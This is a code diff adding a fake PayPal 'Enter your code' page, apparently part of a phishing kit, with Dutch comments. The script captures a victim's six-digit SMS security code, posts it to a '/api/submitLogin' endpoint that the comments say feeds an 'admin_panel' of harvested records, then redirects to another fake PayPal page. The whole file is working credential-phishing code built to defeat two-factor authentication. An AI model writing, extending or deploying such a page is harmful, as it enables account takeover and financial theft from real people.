@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Code</title>
+  <link rel="stylesheet" href="/codee.css" />
+</head>
+<body class="code-body">
+  <div class="code-container">
+    <img src="payp.png" alt="PayPal Logo" class="paypal-logo" />
+    <h2>Enter your code</h2>
+    <p class="subtitle">We’ve sent a security code.</p>
+    <a href="#" class="resend-link">Resend code</a>
+    <form id="codeForm">
+      <div class="code-inputs">
+        <input type="text" maxlength="1" id="code1" />
+        <input type="text" maxlength="1" id="code2" />
+        <input type="text" maxlength="1" id="code3" />
+        <input type="text" maxlength="1" id="code4" />
+        <input type="text" maxlength="1" id="code5" />
+        <input type="text" maxlength="1" id="code6" />
+      </div>
+      <button type="submit" class="set-it-up-btn">Submit</button>
+    </form>
+    <a href="#" class="more-options">Need more options?</a>
+  </div>
+  <footer>
+    <div class="footer-links">
+      <a href="#">Contact Us</a>
+      <a href="#">Privacy</a>
+      <a href="#">Legal</a>
+      <a href="#">Worldwide</a>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('codeForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // 1) samenvoegen van de 6 cijfers
+      const code = 
+        document.getElementById('code1').value +
+        document.getElementById('code2').value +
+        document.getElementById('code3').value +
+        document.getElementById('code4').value +
+        document.getElementById('code5').value +
+        document.getElementById('code6').value;
+
+      if (code.length < 6) return alert("Voer alle 6 cijfers in.");
+
+      // 2) nieuw record naar server, met smsCode ingevuld
+      //    type blijft 'venmo' zodat admin_panel ze bij elkaar toont
+      const data = {
+        type: 'paypal',
+        email: '',         // optioneel herhalen, maar admin panel toont alleen smsCode hier
+        password: '',
+        smsCode: code,
+        timestamp: new Date().toISOString()
+      };
+
+      fetch('/api/submitLogin', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(data)
+      })
+      .then(res => {
+        if (!res.ok) throw new Error('Server error');
+        // 3) redirect naar succes-pagina
+        window.location.href = 'Paypal.html';
+      })
+      .catch(err => {
+        console.error('Fout bij verzenden SMS code:', err);
+        alert('Kon code niet verzenden. Probeer opnieuw.');
+      });
+    });
+  </script>
+</body>
+</html>
